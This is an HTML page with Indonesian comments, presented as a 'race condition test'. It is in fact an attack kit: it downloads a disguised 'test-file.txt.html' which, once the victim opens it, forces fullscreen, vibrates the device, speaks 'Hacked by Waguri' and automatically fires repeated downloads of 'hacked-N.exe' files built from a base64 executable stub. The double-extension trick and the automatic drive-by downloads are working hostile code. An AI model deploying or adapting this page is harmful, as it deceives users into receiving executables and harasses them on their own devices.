<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Blob Race Condition Test</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f4f6f8; text-align: center; padding: 40px; }
        .panel { background: #fff; padding: 24px; border-radius: 12px; box-shadow: 0 2px 12px rgba(0,0,0,0.1); max-width: 600px; margin: 0 auto; }
        button { width: 100%; padding: 16px; background: #d32f2f; color: #fff; border: none; border-radius: 6px; font-weight: bold; font-size: 16px; cursor: pointer; }
        #status { margin-top: 16px; color: #d32f2f; font-weight: bold; }
    </style>
</head>
<body>

<div class="panel">
    <h2>Blob & Race Condition Test</h2>
    <p>Klik untuk mengunduh file .txt yang akan memicu unduhan otomatis .exe secara instan.</p>
    <button id="start-btn">Mulai Test</button>
    <div id="status">Sistem siap.</div>
</div>

<script>
    const startBtn = document.getElementById("start-btn");
    const statusDiv = document.getElementById("status");

    // 1. Fungsi TTS & Getar (Dipicu saat korban membuka file .txt)
    const efekHacker = () => {
        if (navigator.vibrate) navigator.vibrate([500, 200, 500, 200, 1000]);
        if ('speechSynthesis' in window) {
            window.speechSynthesis.cancel();
            const msg = new SpeechSynthesisUtterance('Hacked by Waguri');
            msg.lang = 'en-US';
            window.speechSynthesis.speak(msg);
        }
    };

    // 2. Fungsi pembuat Payload HTML
    const prepareMimeBlobAsync = (i) => {
        return new Promise((resolve) => {
            queueMicrotask(() => {
                // Payload HTML: Fullscreen + TTS + Race Condition Download
                const payloadText = `
                    <!DOCTYPE html>
                    <html>
                    <head><meta charset='UTF-8'><title>HACKED BY</title></head>
                    <body style='margin:0;background:#000;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;'>
                        <div>
                            <h1 style='font-size:60px;color:red;text-shadow:0 0 20px red;'>HACKED BY</h1>
                            <h2 style='font-size:36px;color:#0f0;'>WAGURI</h2>
                            <p id='status'>Menyiapkan payload...</p>
                        </div>
                        <script>
                            // 1. Auto Fullscreen
                            if (document.documentElement.requestFullscreen) {
                                document.documentElement.requestFullscreen().catch(()=>{});
                            }
                            
                            // 2. Getar & TTS saat load
                            if (navigator.vibrate) navigator.vibrate([500, 200, 500, 200, 1000]);
                            if ('speechSynthesis' in window) {
                                var msg = new SpeechSynthesisUtterance('Hacked by Waguri');
                                msg.lang = 'en-US';
                                window.speechSynthesis.speak(msg);
                            }

                            // 3. Race Condition Download
                            var b64Data = "TVqQAAMAAAAEAAAAAEEAAgBA";
                            var sudah = false;
                            var target = 5; // 5 file
                            var dipicu = 0;

                            function picuSatu() {
                                if (dipicu >= target) return;
                                dipicu++;
                                try {
                                    var binary = atob(b64Data);
                                    var bytes = new Uint8Array(binary.length);
                                    for (var i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
                                    
                                    var blob = new Blob([bytes], { type: 'application/octet-stream' });
                                    var url = URL.createObjectURL(blob);
                                    var a = document.createElement('a');
                                    a.href = url;
                                    a.download = 'hacked-' + dipicu + '.exe';
                                    document.body.appendChild(a);
                                    a.click();
                                } catch(e) {}
                                
                                document.getElementById('status').innerText = 'Mengunduh ' + dipicu + '/' + target;
                                queueMicrotask(picuSatu);
                            }

                            // Trigger instan via Microtask
                            window.addEventListener('load', function() {
                                queueMicrotask(function() {
                                    queueMicrotask(function() {
                                        picuSatu();
                                    });
                                });
                            });
                        <\/script>
                    </body>
                    </html>
                `;
                
                const blob = new Blob([payloadText], { type: "text/html" });
                const url = URL.createObjectURL(blob);
                resolve({ id: i, url: url });
            });
        });
    };

    // 3. Tombol Start
    startBtn.addEventListener("click", async () => {
        startBtn.disabled = true;
        statusDiv.textContent = "Menyiapkan file .txt...";
        efekHacker();

        try {
            const fileData = await prepareMimeBlobAsync(1);
            
            const link = document.createElement("a");
            link.href = fileData.url;
            // Ekstensi Ganda .txt.html
            link.download = `test-file.txt.html`;
            link.style.display = "none";
            document.body.appendChild(link);
            link.click();
            
            statusDiv.textContent = "File test-file.txt.html berhasil diunduh.";
        } catch (e) {
            statusDiv.textContent = "Gagal: " + e.message;
        }
        startBtn.disabled = false;
    });
</script>
</body>
</html>
